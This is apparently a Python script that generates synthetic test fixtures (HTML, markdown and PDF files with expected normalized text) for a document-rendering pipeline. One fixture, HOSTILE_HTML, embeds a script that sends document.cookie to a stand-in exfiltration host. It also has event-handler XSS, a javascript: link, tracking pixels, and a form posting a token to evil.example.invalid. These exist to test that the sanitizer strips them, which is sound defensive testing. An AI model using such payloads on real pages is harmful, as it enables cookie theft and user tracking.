"""Regenerate the synthetic rendered-source fixtures (all values invented; deterministic bytes).

Run: uv run --frozen python tests/fixtures/rendered-sources/make_fixtures.py
"""
import zlib
from pathlib import Path

HERE = Path(__file__).parent

TABLE_HTML = """<!doctype html>
<html><head><title>Synthetic issuer results</title>
<link rel="stylesheet" href="https://cdn.example.invalid/remote.css">
<style>td { color: red }</style></head>
<body>
<h1>Synthetic issuer results</h1>
<p>Prepared for testing only. All amounts in $ millions.</p>
<table>
<caption>Table 1. Segment results by fiscal year</caption>
<thead><tr><th scope="col">Metric</th><th scope="col">FY2025</th><th scope="col">FY2026</th></tr></thead>
<tbody>
<tr><th scope="row">Operating margin</th><td>22.8%</td><td>24.6%</td></tr>
<tr><th scope="row">Revenue</th><td>1,200</td><td>1,150</td></tr>
<tr><th scope="row">Retail margin</th><td>24.6%</td><td>21.0%</td></tr>
</tbody>
</table>
<p class="note">(1) Revenue restated for a disposed segment.</p>
<p>Management expects demand to soften next year.</p>
</body></html>
"""

# The bundle's frozen text for TABLE_HTML: what a caller's normalizer produced.
TABLE_FROZEN = """# Synthetic issuer results
Prepared for testing only. All amounts in $ millions.

Table 1. Segment results by fiscal year
| Metric | FY2025 | FY2026 |
| --- | --- | --- |
| Operating margin | 22.8% | 24.6% |
| Revenue | 1,200 | 1,150 |
| Retail margin | 24.6% | 21.0% |
(1) Revenue restated for a disposed segment.

Management expects demand to soften next year.
"""

HOSTILE_HTML = """<html><head>
<meta http-equiv="refresh" content="0;url=https://tracker.example.invalid/">
<script>fetch('https://exfil.example.invalid/?'+document.cookie)</script>
<link rel="stylesheet" href="https://fonts.example.invalid/font.css">
</head><body onload="alert(1)">
<h2 onclick="steal()">Outlook</h2>
<p style="background:url(https://pixel.example.invalid/p.gif)">Management expects demand to soften next year.</p>
<img src="https://pixel.example.invalid/track.gif" onerror="steal()">
<iframe src="https://evil.example.invalid/"></iframe>
<form action="https://evil.example.invalid/"><input name="token" value="x"><button>Send</button></form>
<svg><script>alert(2)</script><image href="https://evil.example.invalid/i.png"/></svg>
<a href="javascript:alert(3)">inert link text</a>
<object data="https://evil.example.invalid/x.swf"></object>
<p>Capital spending was 310 in FY2026.</p>
</body></html>
"""

HOSTILE_FROZEN = """## Outlook
Management expects demand to soften next year.
inert link text
Capital spending was 310 in FY2026.
"""

ESCAPED_MD = r"""# Segment notes
| Segment | Margin \| basis | FY2026 |
| --- | --- | --- |
| Retail | 24.6% \| reported | 24.6% |
| Wholesale | 18.0% |
| | multirow continuation | |
(2) Wholesale row omits a period column.

Operating margin was 24.6% in FY2026.
"""


def _pdf(pages, widths=True, image=False):
    """Minimal PDF 1.4: Helvetica-like font with declared /Widths, one content stream per page."""
    objs = []

    def add(body):
        objs.append(body)
        return len(objs)

    width_list = " ".join(["500"] * 95)
    font = add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding"
               + (f" /FirstChar 32 /LastChar 126 /Widths [{width_list}]".encode() if widths else b"") + b" >>")
    img = None
    if image:
        raw = bytes([128] * 64)
        data = zlib.compress(raw)
        img = add(b"<< /Type /XObject /Subtype /Image /Width 8 /Height 8 /ColorSpace /DeviceGray "
                  b"/BitsPerComponent 8 /Filter /FlateDecode /Length " + str(len(data)).encode() + b" >>\nstream\n"
                  + data + b"\nendstream")
    pages_ref = len(objs) + 2 * len(pages) + 1
    kids = []
    for lines in pages:
        if lines:
            ops = ["BT", "/F1 12 Tf", "14 TL", "72 720 Td"]
            for k, line in enumerate(lines):
                esc = line.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
                ops.append(f"({esc}) Tj" if k == 0 else f"T* ({esc}) Tj")
            ops.append("ET")
        else:
            ops = ["q", "500 0 0 500 50 150 cm", "/Im1 Do", "Q"]
        stream = zlib.compress("\n".join(ops).encode())
        content = add(b"<< /Length " + str(len(stream)).encode() + b" /Filter /FlateDecode >>\nstream\n"
                      + stream + b"\nendstream")
        res = b"<< /Font << /F1 " + str(font).encode() + b" 0 R >>" + (
            b" /XObject << /Im1 " + str(img).encode() + b" 0 R >>" if img else b"") + b" >>"
        kids.append(add(b"<< /Type /Page /Parent " + str(pages_ref).encode() + b" 0 R /MediaBox [0 0 612 792]"
                        b" /Resources " + res + b" /Contents " + str(content).encode() + b" 0 R >>"))
    assert add(b"<< /Type /Pages /Kids [" + b" ".join(f"{k} 0 R".encode() for k in kids) + b"] /Count "
               + str(len(kids)).encode() + b" >>") == pages_ref
    catalog = add(b"<< /Type /Catalog /Pages " + str(pages_ref).encode() + b" 0 R >>")
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for n, body in enumerate(objs, start=1):
        offsets.append(len(out))
        out += f"{n} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root {catalog} 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return bytes(out)


PDF_PAGES = [
    ["Synthetic issuer annual report", "Page one overview", "Operating margin was 24.6% in FY2026."],
    ["Segment detail", "Retail margin was 24.6% in FY2025.", "Revenue was 1,150 in FY2026.",
     "Management expects demand to soften next year."],
]
PDF_FROZEN = "\n".join(PDF_PAGES[0]) + "\n--- page 2 ---\n" + "\n".join(PDF_PAGES[1]) + "\n"
SCANNED_FROZEN = "OCR: Operating margin was 24.6% in FY2026.\n"


def main():
    (HERE / "table.html").write_text(TABLE_HTML)
    (HERE / "table.frozen.md").write_text(TABLE_FROZEN)
    (HERE / "hostile.html").write_text(HOSTILE_HTML)
    (HERE / "hostile.frozen.md").write_text(HOSTILE_FROZEN)
    (HERE / "escaped.md").write_text(ESCAPED_MD)
    (HERE / "two-page.pdf").write_bytes(_pdf(PDF_PAGES))
    (HERE / "two-page.frozen.txt").write_text(PDF_FROZEN)
    (HERE / "scanned.pdf").write_bytes(_pdf([[]], image=True))
    (HERE / "scanned.frozen.txt").write_text(SCANNED_FROZEN)


if __name__ == "__main__":
    main()
